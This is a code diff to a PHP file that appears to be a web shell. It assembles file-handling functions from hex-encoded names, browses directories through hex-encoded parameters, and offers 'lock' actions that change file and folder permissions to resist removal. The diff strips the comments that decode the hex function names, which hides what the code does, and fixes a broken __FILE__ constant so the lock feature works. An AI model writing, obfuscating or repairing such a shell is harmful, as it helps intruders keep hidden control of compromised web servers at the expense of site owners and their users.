@@ -1,15 +1,13 @@
 <?php
 $Array = [
-
-// $GLOBALS['fungsi'][0]
-	'66696c655f6765745f636f6e74656e7473', // f i l e g e t c o n t e n t s => 0
-	'69735f646972', // i s _ d i r => 1
-	'66696c655f7075745f636f6e74656e7473', // f i l e p u t c o n t e n t s  => 2
-	'69735f66696c65', // i s _ f i l e => 3
-	'756e6c696e6b', // u n l i n k => 4
-	'66756E6374696F6E5F657869737473', // f u n c t i o n _ e x i s t s => 5
-	'6261736536345F656E636F6465', // b a s e 6 4 _ d e c o d e => 6
-	'676574637764' // g e t c w d => 7
+	'66696c655f6765745f636f6e74656e7473',
+	'69735f646972',
+	'66696c655f7075745f636f6e74656e7473',
+	'69735f66696c65',
+	'756e6c696e6b',
+	'66756E6374696F6E5F657869737473',
+	'6261736536345F656E636F6465',
+	'676574637764'
 ];
 $hitung_array = count($Array);
 for ($i = 0; $i < $hitung_array; $i++) {
@@ -393,8 +391,7 @@ echo "
         <a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=dark_file'><i class='bi bi-file-earmark'></i> Lock All File</a>
         <a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=dark_folders'><i class='bi bi-file-earmark'></i> Lock All Folders</a>
     </div>
-</div>
-";
+</div>";
 if(isset($_7['dir'])) {
 	$dir = unhex($_7['dir']);
 	chdir($dir);
@@ -495,7 +492,7 @@ if (isset($_GET['id']) && $_GET['id'] === 'dark_folders') {
     echo "Permissions changed for all folders in the current directory.";
 }
 
-$filename = __FILE_;
+$filename = __FILE__;
 
 if (isset($_GET['id']) && $_GET['id'] === 'lockshell') {
     $newPermissions = 0444;
